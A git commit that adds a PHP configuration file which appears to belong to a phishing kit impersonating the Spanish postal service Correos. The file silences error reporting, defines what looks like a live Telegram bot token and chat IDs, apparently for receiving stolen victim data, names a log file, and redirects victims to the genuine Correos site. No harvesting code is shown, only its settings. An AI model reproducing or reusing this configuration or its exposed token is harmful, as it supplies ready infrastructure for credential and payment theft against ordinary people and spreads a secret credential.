9634931a9a89e457cce0ccb4df1fb03984b8ce4d
nc015493 <115229120+nc015493@users.noreply.github.com>
2022-10-07 13:12:58 +0100

    added new files

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5435200715:AAGFS3q7LZiMm36Ia6gsAVPvyKZ0ls4g9vY");
+define("TELEGRAM_CHAT_ID", "-765899316");
+define("TELEGRAM_CHAT_IDD", "-765899316");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
